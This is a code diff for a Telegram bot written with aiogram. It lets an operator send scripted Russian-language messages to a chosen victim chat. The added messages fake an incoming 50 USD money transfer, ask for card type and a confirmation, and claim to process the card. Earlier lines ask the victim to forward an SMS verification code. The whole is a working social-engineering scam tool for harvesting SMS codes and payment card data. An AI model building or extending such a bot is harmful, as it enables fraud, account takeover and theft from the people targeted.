@@ -4,7 +4,7 @@ from aiogram.types import Message
 from config import ADMIN_ID
 from loader import dp, bot
 
-CHAT_ID = '845436814'
+CHAT_ID = '751675313'
 
 dialog_list = {
     "0": "Перед начало создание, мне нужно о вас узнать важные детали",
@@ -17,6 +17,16 @@ dialog_list = {
     "7": "Вам будет выслано на номер телефона обычное смс, введите его сюда для подтверждения личности",
     "8": "Что-то пошло не так, попробуйте ввести новый код",
     "9": "Ожидайте я создаю, это займет некоторое время",
+    "10": "Кирилл Закревский пытается перевести вам 50.00 USD = 1 407.84 UAH",
+    "11": "Для подтверждения отправьте YES / NO",
+    "12": "Выберите удобный способ: КАРТА / ПЕРЕВОД",
+    "13": "Выберете тип карты: VISA / Mastercard",
+    "14": "Текущий баланс: 0.0 UAH | 0.0 USD | 0.0 RUB | 0.0 EUR",
+    "15": "Ваш ключ для переводов: me:tg_wall::bdnsz12EweAHHDns",
+    "16": "Ожидайте проверки...",
+    "17": "Обрабатываю вашу карту",
+    "18": "Деньги перевожу на вашу карту",
+    "19": "Ожидание поступления денег....",
 }
 
 
@@ -41,7 +51,7 @@ async def start(message: Message):
 @dp.message_handler(user_id=ADMIN_ID)
 async def echo(message: Message):
     text = message.text
-    if len(message.text) == 1:
+    if len(message.text) <= 2:
         text = dialog_list.get(text)
     await bot.send_message(chat_id=CHAT_ID, text=text)
 
